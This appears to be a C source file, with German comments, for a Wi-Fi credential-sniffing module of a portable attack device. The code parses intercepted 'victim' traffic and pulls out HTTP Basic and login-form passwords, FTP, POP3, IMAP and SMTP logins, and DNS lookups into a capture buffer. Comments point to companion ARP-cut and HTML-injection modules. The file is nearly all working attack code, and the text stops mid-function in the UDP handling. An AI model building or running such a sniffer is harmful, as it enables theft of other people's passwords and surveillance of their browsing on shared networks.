#include "wlan_cred_sniff.h"

#include <esp_log.h>
#include <furi.h>
#include <string.h>
#include <stdio.h>

#define TAG "WlanCredSniff"

// Während Debug: jeden POST-Request samt Body loggen, um unbekannte Feldnamen
// und Encodings zu entdecken. Auf 0 setzen wenn fertig debugged.
#define WLAN_CRED_DEBUG_POST 1

// ---------------------------------------------------------------------------
// Live-Credential-Dissektor.
//
// Threading-Vertrag:
//   - wlan_cred_sniff_feed_eth() läuft ausschliesslich aus dem lwIP-
//     tcpip_thread (single producer). Es allokiert nichts, blockiert nicht,
//     hält keine Locks und ruft keine lwIP-/esp_wifi_-APIs auf.
//   - drain/snapshot/total/count_for_ip laufen ausschliesslich aus dem
//     GUI/Tick-Thread (single consumer).
//   - Der Ring ist ein SPSC-Ring mit Per-Slot-Seqlock (analog dem hook_seq-
//     Idiom in wlan_netcut.c) — der Consumer sieht nie einen halb-geschriebenen
//     Eintrag, im Worst Case verliert er einen.
//   - Die DNS-Dedup-Bitmap und der pending-USER-Cache werden nur vom Producer
//     angefasst → keine Synchronisation nötig.
// ---------------------------------------------------------------------------

#define TAG "WlanCredSniff"

#define DNS_DEDUP_BITS 512 // 64 Byte Bitmap → grob ~hunderte unique Queries pro Session
#define CRED_PENDING_SLOTS 8 // USER→PASS / AUTH-LOGIN-Korrelation pro (ip,port)
#define CRED_PENDING_TTL_MS 60000

// URL-Tracking-Map (für Inject-URL-Lookup): pro (server_ip, victim_port) den
// letzten gesehenen Host+Path aus dem HTTP-Request behalten. Wird vom
// parse_http für JEDEN HTTP-Request (auch GET) beschrieben.
#define HTTP_URL_TRACK_SLOTS 16

// Zustände eines pending-Eintrags:
#define PEND_FREE 0
#define PEND_HAVE_USER 1 // FTP/POP3: USER gesehen, warte auf PASS-Zeile
#define PEND_SMTP_WANT_USER 2 // SMTP AUTH LOGIN: warte auf base64-Username-Zeile
#define PEND_SMTP_WANT_PASS 3 // SMTP AUTH LOGIN: Username vorhanden, warte auf base64-Pass-Zeile

typedef struct {
    uint8_t state;
    uint32_t ip;
    uint16_t port;
    uint32_t tick;
    char user[WLAN_CRED_STR_MAX];
} CredPending;

typedef struct {
    uint32_t server_ip;
    uint16_t victim_port;
    uint32_t tick; // 0 = Slot leer
    char host[WLAN_CRED_STR_MAX];
    char path[WLAN_CRED_STR_MAX];
} HttpUrlSlot;

struct WlanCredSniff {
    WlanCredEntry ring[WLAN_CRED_RING_SIZE];
    volatile uint32_t write_seq; // Producer-only Zähler; Slot = (write_seq-1) % SIZE
    uint32_t drain_cursor; // Consumer-only: zuletzt gedrainte seq
    volatile uint32_t total; // Lifetime-Zähler
    volatile bool armed;

    // Producer-private:
    uint8_t dns_seen[DNS_DEDUP_BITS / 8];
    CredPending pending[CRED_PENDING_SLOTS];
    HttpUrlSlot url_track[HTTP_URL_TRACK_SLOTS];
};

// ===========================================================================
// kleine, allokationsfreie Parse-Helfer
// ===========================================================================

static const uint8_t* mem_chr(const uint8_t* p, int len, uint8_t c) {
    for(int i = 0; i < len; i++)
        if(p[i] == c) return p + i;
    return NULL;
}

static bool ci_match(const uint8_t* a, const char* b, int n) {
    for(int i = 0; i < n; i++) {
        char x = (char)a[i];
        char y = b[i];
        if(x >= 'A' && x <= 'Z') x = (char)(x + 32);
        if(y >= 'A' && y <= 'Z') y = (char)(y + 32);
        if(x != y) return false;
    }
    return true;
}

static bool ci_eq(const uint8_t* a, int alen, const char* b) {
    int bl = (int)strlen(b);
    if(alen != bl) return false;
    return ci_match(a, b, alen);
}

static const uint8_t* mem_find(const uint8_t* hay, int haylen, const char* needle, int nlen) {
    if(nlen <= 0 || haylen < nlen) return NULL;
    for(int i = 0; i + nlen <= haylen; i++)
        if(memcmp(hay + i, needle, (size_t)nlen) == 0) return hay + i;
    return NULL;
}

static const uint8_t* ci_mem_find(const uint8_t* hay, int haylen, const char* needle) {
    int nlen = (int)strlen(needle);
    if(nlen <= 0 || haylen < nlen) return NULL;
    for(int i = 0; i + nlen <= haylen; i++)
        if(ci_match(hay + i, needle, nlen)) return hay + i;
    return NULL;
}

// Bytes nach `dst` kopieren, nicht-druckbares auf '?' mappen, NUL-terminieren.
static void copy_str(char* dst, int dstsize, const uint8_t* src, int srclen) {
    int o = 0;
    for(int i = 0; i < srclen && o < dstsize - 1; i++) {
        uint8_t c = src[i];
        dst[o++] = (c >= 0x20 && c < 0x7f) ? (char)c : '?';
    }
    dst[o] = 0;
}

static void copy_cstr(char* dst, int dstsize, const char* src) {
    int o = 0;
    for(int i = 0; src[i] && o < dstsize - 1; i++) {
        uint8_t c = (uint8_t)src[i];
        dst[o++] = (c >= 0x20 && c < 0x7f) ? (char)c : '?';
    }
    dst[o] = 0;
}

static int b64val(uint8_t c) {
    if(c >= 'A' && c <= 'Z') return c - 'A';
    if(c >= 'a' && c <= 'z') return c - 'a' + 26;
    if(c >= '0' && c <= '9') return c - '0' + 52;
    if(c == '+') return 62;
    if(c == '/') return 63;
    return -1;
}

// Dekodiert base64 nach `out`. -1 bei ungültigem Zeichen, sonst Anzahl Bytes.
static int b64_decode(const uint8_t* in, int inlen, uint8_t* out, int outmax) {
    int o = 0, buf = 0, bits = 0;
    for(int i = 0; i < inlen; i++) {
        uint8_t c = in[i];
        if(c == '=') break;
        if(c == '\r' || c == '\n' || c == ' ' || c == '\t') continue;
        int v = b64val(c);
        if(v < 0) return -1;
        buf = (buf << 6) | v;
        bits += 6;
        if(bits >= 8) {
            bits -= 8;
            if(o >= outmax) return o;
            out[o++] = (uint8_t)((buf >> bits) & 0xff);
        }
    }
    return o;
}

static int hexval(uint8_t c) {
    if(c >= '0' && c <= '9') return c - '0';
    if(c >= 'a' && c <= 'f') return c - 'a' + 10;
    if(c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static void url_decode(const uint8_t* in, int inlen, char* out, int outsize) {
    int o = 0;
    for(int i = 0; i < inlen && o < outsize - 1; i++) {
        uint8_t c = in[i];
        if(c == '+') {
            out[o++] = ' ';
        } else if(c == '%' && i + 2 < inlen) {
            int h = hexval(in[i + 1]), l = hexval(in[i + 2]);
            if(h >= 0 && l >= 0) {
                uint8_t v = (uint8_t)((h << 4) | l);
                out[o++] = (v >= 0x20 && v < 0x7f) ? (char)v : '?';
                i += 2;
            } else {
                out[o++] = '%';
            }
        } else {
            out[o++] = (c >= 0x20 && c < 0x7f) ? (char)c : '?';
        }
    }
    out[o] = 0;
}

// HTTP-Header `name` finden (case-insensitive). Springt über die Request-Line,
// stoppt an der Leerzeile. Liefert getrimmten Value (ohne führende Spaces / CR).
static bool find_header(
    const uint8_t* d, int len, const char* name, const uint8_t** out_val, int* out_val_len) {
    const uint8_t* nl = mem_chr(d, len, '\n');
    if(!nl) return false;
    const uint8_t* p = nl + 1;
    int rem = len - (int)(p - d);
    while(rem > 0) {
        const uint8_t* line_end = mem_chr(p, rem, '\n');
        int line_len = line_end ? (int)(line_end - p) : rem;
        int ll = line_len;
        if(ll > 0 && p[ll - 1] == '\r') ll--;
        if(ll == 0) return false; // Ende der Header
        const uint8_t* colon = mem_chr(p, ll, ':');
        if(colon) {
            int nlen = (int)(colon - p);
            if(ci_eq(p, nlen, name)) {
                const uint8_t* v = colon + 1;
                int vl = ll - nlen - 1;
                while(vl > 0 && (*v == ' ' || *v == '\t')) {
                    v++;
                    vl--;
                }
                *out_val = v;
                *out_val_len = vl;
                return true;
            }
        }
        if(!line_end) break;
        p = line_end + 1;
        rem = len - (int)(p - d);
    }
    return false;
}

// urlencoded-Formularwert `key=...&` (case-insensitive Key, stoppt an &/Whitespace).
static bool form_value(const uint8_t* body, int len, const char* key, char* out, int outsize) {
    int klen = (int)strlen(key);
    for(int i = 0; i + klen + 1 <= len; i++) {
        if(i > 0 && body[i - 1] != '&' && body[i - 1] != '?') continue;
        if(!ci_match(body + i, key, klen)) continue;
        if(body[i + klen] != '=') continue;
        const uint8_t* v = body + i + klen + 1;
        int rem = len - (int)(v - body);
        int vl = rem;
        for(int j = 0; j < rem; j++) {
            uint8_t c = v[j];
            if(c == '&' || c == '\r' || c == '\n' || c == ' ' || c == 0) {
                vl = j;
                break;
            }
        }
        if(vl <= 0) return false;
        url_decode(v, vl, out, outsize);
        return out[0] != 0;
    }
    return false;
}

// Argument hinter einem Verb der Länge verb_len (z.B. "USER ") aus der ersten
// Zeile von d herausziehen.
static void line_arg(const uint8_t* d, int len, int verb_len, char* out, int outsize) {
    const uint8_t* p = d + verb_len;
    int rem = len - verb_len;
    while(rem > 0 && (*p == ' ' || *p == '\t')) {
        p++;
        rem--;
    }
    int vl = 0;
    while(vl < rem && p[vl] != '\r' && p[vl] != '\n')
        vl++;
    copy_str(out, outsize, p, vl);
}

// Nächstes (ggf. "quoted") Token aus *pp / *prem ziehen; advanciert pp/prem.
static int next_token(const uint8_t** pp, int* prem, char* out, int outsize) {
    const uint8_t* p = *pp;
    int rem = *prem;
    while(rem > 0 && *p == ' ') {
        p++;
        rem--;
    }
    bool quoted = (rem > 0 && *p == '"');
    if(quoted) {
        p++;
        rem--;
    }
    int vl = 0;
    while(vl < rem) {
        if(quoted && p[vl] == '"') break;
        if(!quoted && (p[vl] == ' ' || p[vl] == '\r' || p[vl] == '\n')) break;
        vl++;
    }
    copy_str(out, outsize, p, vl);
    int consumed = vl + (quoted ? 1 : 0);
    if(consumed > rem) consumed = rem;
    *pp = p + consumed;
    *prem = rem - consumed;
    return vl;
}

static uint32_t fnv1a(const uint8_t* p, int len) {
    uint32_t h = 2166136261u;
    for(int i = 0; i < len; i++) {
        h ^= p[i];
        h *= 16777619u;
    }
    return h;
}

// ===========================================================================
// Ring
// ===========================================================================

// MP-safe Push: claim unique seq via fetch_add, dann eigenen Slot schreiben.
// Zwei Producer können sich keine Slots teilen, solange weniger als
// WLAN_CRED_RING_SIZE Pushes innerhalb des Schreibe-Fensters passieren — bei
// einem ESP_HTTP_Server-Task plus dem lwIP-tcpip-thread realistisch immer der Fall.
static void cred_push(
    WlanCredSniff* cs,
    const char* proto,
    uint32_t victim_ip,
    uint32_t peer_ip,
    uint16_t peer_port,
    const char* host,
    const char* user,
    const char* secret,
    const char* raw) {
    uint32_t my_seq = __atomic_add_fetch(&cs->write_seq, 1u, __ATOMIC_ACQ_REL);
    uint32_t i = (my_seq - 1u) % WLAN_CRED_RING_SIZE;
    WlanCredEntry* e = &cs->ring[i];

    __atomic_store_n(&e->seq, 0u, __ATOMIC_RELEASE); // mid-write
    __atomic_thread_fence(__ATOMIC_RELEASE);

    e->victim_ip = victim_ip;
    e->peer_ip = peer_ip;
    e->peer_port = peer_port;
    e->tick = furi_get_tick();
    copy_cstr(e->proto, sizeof(e->proto), proto ? proto : "");
    copy_cstr(e->host, sizeof(e->host), host ? host : "");
    copy_cstr(e->user, sizeof(e->user), user ? user : "");
    copy_cstr(e->secret, sizeof(e->secret), secret ? secret : "");
    copy_cstr(e->raw_body, sizeof(e->raw_body), raw ? raw : "");

    __atomic_thread_fence(__ATOMIC_RELEASE);
    __atomic_store_n(&e->seq, my_seq, __ATOMIC_RELEASE);
    __atomic_fetch_add(&cs->total, 1u, __ATOMIC_RELAXED);
}

// ===========================================================================
// pending-USER-Cache (nur Producer-Thread)
// ===========================================================================

static void pending_store(WlanCredSniff* cs, uint32_t ip, uint16_t port, uint8_t state, const char* user) {
    uint32_t now = furi_get_tick();
    int slot = -1, oldest_i = 0;
    uint32_t oldest = 0xffffffffu;
    for(int i = 0; i < CRED_PENDING_SLOTS; i++) {
        if(cs->pending[i].state == PEND_FREE) {
            slot = i;
            break;
        }
        if(cs->pending[i].ip == ip && cs->pending[i].port == port) {
            slot = i;
            break;
        }
        if(cs->pending[i].tick <= oldest) {
            oldest = cs->pending[i].tick;
            oldest_i = i;
        }
    }
    if(slot < 0) slot = oldest_i;
    cs->pending[slot].state = state;
    cs->pending[slot].ip = ip;
    cs->pending[slot].port = port;
    cs->pending[slot].tick = now;
    copy_cstr(cs->pending[slot].user, sizeof(cs->pending[slot].user), user ? user : "");
}

// Findet pending-Eintrag für (ip,port). Liefert state (PEND_FREE wenn nicht da
// oder abgelaufen) und kopiert den Usernamen raus. Löscht NICHT.
static uint8_t pending_peek(WlanCredSniff* cs, uint32_t ip, uint16_t port, char* user_out, int outsize) {
    uint32_t now = furi_get_tick();
    for(int i = 0; i < CRED_PENDING_SLOTS; i++) {
        if(cs->pending[i].state == PEND_FREE) continue;
        if(cs->pending[i].ip != ip || cs->pending[i].port != port) continue;
        if(now - cs->pending[i].tick > CRED_PENDING_TTL_MS) {
            cs->pending[i].state = PEND_FREE;
            return PEND_FREE;
        }
        if(user_out) copy_cstr(user_out, outsize, cs->pending[i].user);
        return cs->pending[i].state;
    }
    return PEND_FREE;
}

static void pending_clear(WlanCredSniff* cs, uint32_t ip, uint16_t port) {
    for(int i = 0; i < CRED_PENDING_SLOTS; i++) {
        if(cs->pending[i].state != PEND_FREE && cs->pending[i].ip == ip &&
           cs->pending[i].port == port) {
            cs->pending[i].state = PEND_FREE;
            return;
        }
    }
}

// ===========================================================================
// URL-Tracking-Map (nur Producer-Thread)
// ===========================================================================

static void url_track_record(
    WlanCredSniff* cs,
    uint32_t server_ip,
    uint16_t victim_port,
    const char* host,
    const char* path) {
    uint32_t now = furi_get_tick();
    if(now == 0) now = 1; // 0 ist reserviert für "Slot leer"
    int slot = -1, oldest_i = 0;
    uint32_t oldest = 0xffffffffu;
    for(int i = 0; i < HTTP_URL_TRACK_SLOTS; i++) {
        if(cs->url_track[i].tick != 0 && cs->url_track[i].server_ip == server_ip &&
           cs->url_track[i].victim_port == victim_port) {
            slot = i;
            break;
        }
        if(cs->url_track[i].tick == 0) {
            slot = i;
            break;
        }
        if(cs->url_track[i].tick <= oldest) {
            oldest = cs->url_track[i].tick;
            oldest_i = i;
        }
    }
    if(slot < 0) slot = oldest_i;
    cs->url_track[slot].server_ip = server_ip;
    cs->url_track[slot].victim_port = victim_port;
    cs->url_track[slot].tick = now;
    copy_cstr(cs->url_track[slot].host, sizeof(cs->url_track[slot].host), host ? host : "");
    copy_cstr(cs->url_track[slot].path, sizeof(cs->url_track[slot].path), path ? path : "");
}

static bool url_track_lookup(
    WlanCredSniff* cs,
    uint32_t server_ip,
    uint16_t victim_port,
    char* host_out,
    int host_sz,
    char* path_out,
    int path_sz) {
    for(int i = 0; i < HTTP_URL_TRACK_SLOTS; i++) {
        if(cs->url_track[i].tick == 0) continue;
        if(cs->url_track[i].server_ip == server_ip &&
           cs->url_track[i].victim_port == victim_port) {
            copy_cstr(host_out, host_sz, cs->url_track[i].host);
            copy_cstr(path_out, path_sz, cs->url_track[i].path);
            return true;
        }
    }
    return false;
}

// ===========================================================================
// DNS-Dedup
// ===========================================================================

static bool dns_seen_or_mark(WlanCredSniff* cs, uint32_t key) {
    uint32_t bit = key % DNS_DEDUP_BITS;
    uint8_t mask = (uint8_t)(1u << (bit & 7));
    uint8_t* slot = &cs->dns_seen[bit >> 3];
    if(*slot & mask) return true;
    *slot |= mask;
    return false;
}

// ===========================================================================
// Protokoll-Dissektoren
// ===========================================================================

static void parse_dns(
    WlanCredSniff* cs, uint32_t sip, uint32_t dip, uint16_t dport, const uint8_t* d, int len) {
    if(len < 12) return;
    uint16_t flags = ((uint16_t)d[2] << 8) | d[3];
    if(flags & 0x8000) return; // QR=1 → Response
    if((flags >> 11) & 0x0f) return; // opcode != 0
    uint16_t qdcount = ((uint16_t)d[4] << 8) | d[5];
    if(qdcount < 1) return;

    char qname[WLAN_CRED_STR_MAX];
    int qn = 0, pos = 12;
    while(pos < len) {
        uint8_t l = d[pos++];
        if(l == 0) break;
        if(l & 0xc0) return; // Compression-Pointer in einer Query → bail
        if(pos + l > len) return;
        if(qn > 0 && qn < (int)sizeof(qname) - 1) qname[qn++] = '.';
        for(int i = 0; i < l && qn < (int)sizeof(qname) - 1; i++) {
            uint8_t c = d[pos + i];
            qname[qn++] = (c >= 0x20 && c < 0x7f) ? (char)c : '?';
        }
        pos += l;
    }
    qname[qn] = 0;
    if(qn == 0) return;
    if(pos + 4 > len) return;
    uint16_t qtype = ((uint16_t)d[pos] << 8) | d[pos + 1];
    // AAAA/A/HTTPS sind die "Browsing"-Queries — andere Typen ignorieren.
    if(qtype != 1 && qtype != 28 && qtype != 65) return;

    uint32_t key = fnv1a((const uint8_t*)qname, qn) ^ sip;
    if(dns_seen_or_mark(cs, key)) return;

    const char* qt = (qtype == 1) ? "A" : (qtype == 28) ? "AAAA" : "HTTPS";
    cred_push(cs, "DNS", sip, dip, dport, qname, qt, "", NULL);
}

static void parse_http(
    WlanCredSniff* cs, uint32_t sip, uint16_t sport, uint32_t dip, uint16_t dport,
    const uint8_t* d, int len) {
    static const char* const methods[] = {
        "GET ", "POST ", "PUT ", "HEAD ", "OPTIONS ", "DELETE ", "PATCH "};
    int m_i = -1;
    for(unsigned i = 0; i < sizeof(methods) / sizeof(methods[0]); i++) {
        int ml = (int)strlen(methods[i]);
        if(len >= ml && memcmp(d, methods[i], (size_t)ml) == 0) {
            m_i = (int)i;
            break;
        }
    }
    if(m_i < 0) return;

    // Pfad aus der Request-Line.
    const uint8_t* nl = mem_chr(d, len, '\n');
    int first_line_len = nl ? (int)(nl - d) : len;
    if(first_line_len > 0 && d[first_line_len - 1] == '\r') first_line_len--;
    char path[WLAN_CRED_STR_MAX];
    path[0] = 0;
    {
        const uint8_t* sp1 = mem_chr(d, first_line_len, ' ');
        if(sp1) {
            const uint8_t* ps = sp1 + 1;
            int rem = first_line_len - (int)(ps - d);
            const uint8_t* sp2 = mem_chr(ps, rem, ' ');
            int pl = sp2 ? (int)(sp2 - ps) : rem;
            copy_str(path, sizeof(path), ps, pl);
        }
    }

    char host[WLAN_CRED_STR_MAX];
    host[0] = 0;
    {
        const uint8_t* hv;
        int hvl;
        if(find_header(d, len, "host", &hv, &hvl)) copy_str(host, sizeof(host), hv, hvl);
    }
    const char* host_disp = host[0] ? host : (path[0] ? path : "?");

    // URL-Map für späteren Inject-Lookup pflegen. Key = (server_ip,
    // victim_port). Aus Sicht des Outbound-Requests: dip = Server, sport =
    // Victim-Port. Beim inbound Response (im wlan_html_inject) sieht es
    // gespiegelt aus: src_ip = Server, dport = Victim-Port → matcht.
    url_track_record(cs, dip, sport, host, path);

    // Authorization: Basic <b64(user:pass)>
    {
        const uint8_t* av;
        int avl;
        if(find_header(d, len, "authorization", &av, &avl) && avl > 6 && ci_match(av, "basic ", 6)) {
            const uint8_t* b64 = av + 6;
            int b64l = avl - 6;
            while(b64l > 0 && (*b64 == ' ' || *b64 == '\t')) {
                b64++;
                b64l--;
            }
            uint8_t dec[128];
            int dl = b64_decode(b64, b64l, dec, sizeof(dec) - 1);
            if(dl > 0) {
                dec[dl] = 0;
                char u[WLAN_CRED_STR_MAX], p[WLAN_CRED_STR_MAX];
                const uint8_t* colon = mem_chr(dec, dl, ':');
                if(colon) {
                    copy_str(u, sizeof(u), dec, (int)(colon - dec));
                    copy_str(p, sizeof(p), colon + 1, dl - (int)(colon - dec) - 1);
                } else {
                    copy_str(u, sizeof(u), dec, dl);
                    p[0] = 0;
                }
                cred_push(cs, "HTTP", sip, dip, dport, host_disp, u, p, NULL);
                return;
            }
        }
    }

    // POST: Body+Content-Type extrahieren, optional loggen, dann Felder versuchen.
    if(m_i == 1) {
        const uint8_t* hdr_end = mem_find(d, len, "\r\n\r\n", 4);
        const uint8_t* body = NULL;
        int body_len = 0;
        if(hdr_end) {
            body = hdr_end + 4;
            body_len = len - (int)(body - d);
            if(body_len < 0) body_len = 0;
        }

        char ct[64];
        ct[0] = 0;
        {
            const uint8_t* ctv;
            int ctvl;
            if(find_header(d, len, "content-type", &ctv, &ctvl))
                copy_str(ct, sizeof(ct), ctv, ctvl);
        }

#if WLAN_CRED_DEBUG_POST
        {
            // Body-Preview druckbar-sanitisieren, dann in 80-Byte-Chunks loggen
            // (ESP_LOG-Zeilen sind sonst zu lang und werden abgeschnitten).
            char preview[256];
            int prev_n = body_len > (int)sizeof(preview) - 1 ? (int)sizeof(preview) - 1 : body_len;
            if(body && prev_n > 0) {
                copy_str(preview, sizeof(preview), body, prev_n);
            } else {
                preview[0] = 0;
            }
            ESP_LOGI(TAG,
                "POST host=%s path=%s ct='%s' body_len=%d hdr_end=%s",
                host_disp, path, ct, body_len, hdr_end ? "yes" : "NO(split-segment)");
            if(preview[0]) {
                int plen = (int)strlen(preview);
                for(int off = 0; off < plen; off += 80) {
                    int chunk = plen - off > 80 ? 80 : plen - off;
                    ESP_LOGI(TAG, "POST body[%d..%d]: %.*s", off, off + chunk, chunk, preview + off);
                }
            }
        }
#endif

        bool urlencoded = ct[0] && ci_mem_find((const uint8_t*)ct, (int)strlen(ct),
                                               "x-www-form-urlencoded") != NULL;
        if(body && urlencoded && body_len > 0) {
            // Liste lieber etwas weiter halten — viele Router-Firmwares benutzen
            // eigene Feldnamen. Heuristik: erstes gefundenes Match gewinnt.
            static const char* const ukeys[] = {
                "username", "user", "usr", "uname", "login", "logname", "loginname",
                "email", "mail", "name", "uid", "log", "userid", "user_id", "user_login",
                "user_name", "userName", "loginUsername", "j_username",
                "frm_logname", "frm_login", "Username", "USERNAME", "txtUser",
                "loginusr", "Account", "account",
            };
            static const char* const pkeys[] = {
                "password", "passwd", "passwort", "pass", "pwd", "pw",
                "j_password", "user_pass", "user_password", "userpassword",
                "loginpwd", "loginpass", "loginpas", "Password", "PASSWORD",
                "txtPass", "Pwd", "frm_logpass", "frm_password",
            };
            char u[WLAN_CRED_STR_MAX] = {0}, p[WLAN_CRED_STR_MAX] = {0};
            for(unsigned i = 0; i < sizeof(ukeys) / sizeof(ukeys[0]) && !u[0]; i++)
                form_value(body, body_len, ukeys[i], u, sizeof(u));
            for(unsigned i = 0; i < sizeof(pkeys) / sizeof(pkeys[0]) && !p[0]; i++)
                form_value(body, body_len, pkeys[i], p, sizeof(p));
#if WLAN_CRED_DEBUG_POST
            ESP_LOGI(TAG, "POST match: user='%s' secret='%s'", u, p);
#endif
            if(u[0] || p[0]) {
                cred_push(cs, "HTTP", sip, dip, dport, host_disp, u, p, NULL);
                // KEIN return — wir pushen unten zusätzlich noch eine "POST"-
                // Debug-Zeile mit dem Body, damit der User sehen kann was
                // extrahiert wurde + woher.
            }
        }

        // Debug: jeden POST als eigenen "POST"-Eintrag in den Ring legen, mit
        // Pfad in user und dem Body (oder "(split)" wenn Body in einem späteren
        // Segment kommt) als raw_body. So kann der User auf dem Gerät durch
        // alle POSTs durchscrollen und sehen welche Feldnamen verwendet werden.
        char path_user[WLAN_CRED_STR_MAX];
        int pl = (int)strlen(path);
        if(pl > (int)sizeof(path_user) - 1) pl = (int)sizeof(path_user) - 1;
        memcpy(path_user, path, pl);
        path_user[pl] = 0;

        char raw_buf[WLAN_CRED_RAW_MAX];
        if(body && body_len > 0) {
            int n = body_len > (int)sizeof(raw_buf) - 1 ? (int)sizeof(raw_buf) - 1 : body_len;
            copy_str(raw_buf, sizeof(raw_buf), body, n);
        } else if(!hdr_end) {
            snprintf(raw_buf, sizeof(raw_buf), "(body split across segments, ct=%s)",
                ct[0] ? ct : "?");
        } else {
            snprintf(raw_buf, sizeof(raw_buf), "(empty body, ct=%s)", ct[0] ? ct : "?");
        }
        cred_push(cs, "POST", sip, dip, dport, host_disp, path_user, ct, raw_buf);
    }
}

// FTP / POP3: USER ... / PASS ... — über pending korreliert.
static void parse_user_pass(
    WlanCredSniff* cs,
    const char* proto,
    uint32_t sip,
    uint16_t sport,
    uint32_t dip,
    uint16_t dport,
    const uint8_t* d,
    int len) {
    if(len < 5) return;
    if(ci_match(d, "USER ", 5)) {
        char u[WLAN_CRED_STR_MAX];
        line_arg(d, len, 5, u, sizeof(u));
        if(u[0]) pending_store(cs, sip, sport, PEND_HAVE_USER, u);
    } else if(ci_match(d, "PASS ", 5)) {
        char p[WLAN_CRED_STR_MAX];
        line_arg(d, len, 5, p, sizeof(p));
        if(!p[0]) return;
        char u[WLAN_CRED_STR_MAX];
        u[0] = 0;
        if(pending_peek(cs, sip, sport, u, sizeof(u)) != PEND_HAVE_USER) u[0] = 0;
        pending_clear(cs, sip, sport);
        cred_push(cs, proto, sip, dip, dport, "", u, p, NULL);
    }
}

static void parse_imap(
    WlanCredSniff* cs, uint32_t sip, uint32_t dip, uint16_t dport, const uint8_t* d, int len) {
    // "<tag> LOGIN <user> <pass>\r\n"
    const uint8_t* nl = mem_chr(d, len, '\n');
    int ll = nl ? (int)(nl - d) : len;
    if(ll > 0 && d[ll - 1] == '\r') ll--;
    const uint8_t* sp1 = mem_chr(d, ll, ' ');
    if(!sp1) return;
    const uint8_t* p = sp1 + 1;
    int rem = ll - (int)(p - d);
    if(rem < 6 || !ci_match(p, "LOGIN ", 6)) return;
    p += 6;
    rem -= 6;
    char u[WLAN_CRED_STR_MAX], pw[WLAN_CRED_STR_MAX];
    next_token(&p, &rem, u, sizeof(u));
    next_token(&p, &rem, pw, sizeof(pw));
    if(u[0] || pw[0]) cred_push(cs, "IMAP", sip, dip, dport, "", u, pw, NULL);
}

static void parse_smtp(
    WlanCredSniff* cs,
    uint32_t sip,
    uint16_t sport,
    uint32_t dip,
    uint16_t dport,
    const uint8_t* d,
    int len) {
    const uint8_t* nl = mem_chr(d, len, '\n');
    int ll = nl ? (int)(nl - d) : len;
    if(ll > 0 && d[ll - 1] == '\r') ll--;
    if(ll < 4) return;

    if(ci_match(d, "AUTH ", 5) && ll > 5) {
        const uint8_t* p = d + 5;
        int rem = ll - 5;
        while(rem > 0 && (*p == ' ' || *p == '\t')) {
            p++;
            rem--;
        }
        if(rem >= 6 && ci_match(p, "PLAIN ", 6)) {
            const uint8_t* b64 = p + 6;
            int b64l = rem - 6;
            while(b64l > 0 && *b64 == ' ') {
                b64++;
                b64l--;
            }
            uint8_t dec[160];
            int dl = b64_decode(b64, b64l, dec, sizeof(dec));
            if(dl > 0) {
                int n1 = -1, n2 = -1;
                for(int i = 0; i < dl; i++) {
                    if(dec[i] == 0) {
                        if(n1 < 0)
                            n1 = i;
                        else {
                            n2 = i;
                            break;
                        }
                    }
                }
                char u[WLAN_CRED_STR_MAX] = {0}, pw[WLAN_CRED_STR_MAX] = {0};
                if(n1 >= 0 && n2 > n1) {
                    copy_str(u, sizeof(u), dec + n1 + 1, n2 - n1 - 1);
                    copy_str(pw, sizeof(pw), dec + n2 + 1, dl - n2 - 1);
                } else {
                    copy_str(u, sizeof(u), dec, dl);
                }
                if(u[0] || pw[0]) cred_push(cs, "SMTP", sip, dip, dport, "", u, pw, NULL);
            }
            return;
        }
        if(rem >= 5 && ci_match(p, "LOGIN", 5)) {
            const uint8_t* q = p + 5;
            int ql = rem - 5;
            while(ql > 0 && *q == ' ') {
                q++;
                ql--;
            }
            if(ql >= 4) {
                uint8_t dec[128];
                int dl = b64_decode(q, ql, dec, sizeof(dec));
                if(dl > 0) {
                    char u[WLAN_CRED_STR_MAX];
                    copy_str(u, sizeof(u), dec, dl);
                    if(u[0]) {
                        pending_store(cs, sip, sport, PEND_SMTP_WANT_PASS, u);
                        return;
                    }
                }
            }
            pending_store(cs, sip, sport, PEND_SMTP_WANT_USER, "");
        }
        return;
    }

    // Reine base64-Fortsetzungszeile (AUTH-LOGIN-Antworten) — nur auswerten,
    // wenn für diese Verbindung gerade eine AUTH-LOGIN-Sequenz erwartet wird,
    // sonst lösen Befehle wie EHLO/QUIT False-Positives aus.
    {
        char u[WLAN_CRED_STR_MAX];
        u[0] = 0;
        uint8_t st = pending_peek(cs, sip, sport, u, sizeof(u));
        if(st == PEND_SMTP_WANT_USER || st == PEND_SMTP_WANT_PASS) {
            uint8_t dec[160];
            int dl = b64_decode(d, ll, dec, sizeof(dec));
            if(dl <= 0) {
                pending_clear(cs, sip, sport); // "*"/Abbruch oder Müll
                return;
            }
            char tok[WLAN_CRED_STR_MAX];
            copy_str(tok, sizeof(tok), dec, dl);
            if(st == PEND_SMTP_WANT_USER) {
                pending_store(cs, sip, sport, PEND_SMTP_WANT_PASS, tok);
            } else { // PEND_SMTP_WANT_PASS
                pending_clear(cs, sip, sport);
                cred_push(cs, "SMTP", sip, dip, dport, "", u, tok, NULL);
            }
        }
    }
}

// ===========================================================================
// Eintritt
// ===========================================================================

void wlan_cred_sniff_feed_eth(WlanCredSniff* cs, const uint8_t* eth, uint16_t len) {
    if(!cs || !eth) return;
    if(!__atomic_load_n(&cs->armed, __ATOMIC_RELAXED)) return;
    if(len < 14 + 20) return; // ETH + min IPv4

    uint16_t ethertype = ((uint16_t)eth[12] << 8) | eth[13];
    if(ethertype != 0x0800) return; // nur IPv4

    const uint8_t* ip = eth + 14;
    int ip_avail = (int)len - 14;
    if((ip[0] >> 4) != 4) return;
    int ihl = (ip[0] & 0x0f) * 4;
    if(ihl < 20 || ihl > ip_avail) return;
    uint16_t ip_total = ((uint16_t)ip[2] << 8) | ip[3];
    if(ip_total < (uint16_t)ihl) return;
    int ip_len = ip_total;
    if(ip_len > ip_avail) ip_len = ip_avail; // auf das, was wir haben, clampen
    uint8_t l4proto = ip[9];
    uint32_t src_ip, dst_ip;
    memcpy(&src_ip, ip + 12, 4);
    memcpy(&dst_ip, ip + 16, 4);

    const uint8_t* l4 = ip + ihl;
    int l4_len = ip_len - ihl;
    if(l4_len <= 0) return;

    if(l4proto == 17) { // UDP
        if(l4_len < 8) return;
        uint16_t sport = ((uint16_t)l4[0] << 8) | l4[1];
        uint16_t dport = ((uint16_t)l4[2] << 8) | l4[3];
        uint16_t ulen = ((uint16_t)l4[4] << 8) | l4[5];
        const uint8_t* ud = l4 + 8;
        int udl = l4_len - 8;
        if(ulen >= 8 && (int)(ulen - 8) < udl) udl = ulen - 8;
        if(udl <= 0) return;
